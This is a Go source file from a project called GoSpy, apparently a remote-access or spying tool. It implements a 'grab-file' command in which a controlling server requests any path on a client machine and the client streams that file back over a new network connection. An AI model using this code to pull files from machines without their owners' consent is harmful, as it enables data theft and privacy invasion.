package commands

import (
	"errors"
	"fmt"
	"github.com/psidex/GoSpy/internal/comms"
	"github.com/psidex/GoSpy/internal/server/conman"
	"io"
	"os"
)

// GrabFileReply sends the selected file over the network to the server.
func GrabFileReply(cmdCon comms.Connection, localFilePath string) (err error) {
	// Let the server know if the file exists or not.
	if _, statErr := os.Stat(localFilePath); statErr == nil {
		if err = cmdCon.SendString("ok"); err != nil {
			return err
		}
	} else {
		return cmdCon.SendString("err")
	}

	// The new connection is created first so if the client or server has a file r/w err the connection is closed which
	// signifies to the other process to not continue with the command. (same with GrabFileSend).
	fileTransferConn, err := cmdCon.DialRemote()
	if err != nil {
		return err
	}
	defer fileTransferConn.Close()

	fd, err := os.Open(localFilePath)
	if err != nil {
		return err
	}
	defer fd.Close()

	if _, err = io.Copy(fileTransferConn, fd); err != nil {
		return err
	}
	return nil
}

// GrabFileSend requests a file on the client at src and writes it to dst on the current machine.
func GrabFileSend(man conman.ConMan, src, dst string) (err error) {
	test := fmt.Sprintf("grab-file %s", src)
	if err = man.CmdCon.SendString(test); err != nil {
		return err
	}

	isOk, err := man.CmdCon.RecvString()
	if err != nil {
		return err
	}
	if isOk == "err" {
		return errors.New("file does not exist on client")
	}

	fileTransferConn := man.AcceptSuccessful()
	defer fileTransferConn.Close()

	fd, err := os.Create(dst)
	if err != nil {
		return err
	}
	defer fd.Close()

	_, err = io.Copy(fd, fileTransferConn)

	if err == nil {
		fmt.Println("File copy complete")
	} else if comms.IsNetworkError(err) {
		fmt.Printf("Error with file copy connection: %s\n", err.Error())
		// Only network errors with CmdCon should be returned.
		return nil
	}
	return err
}
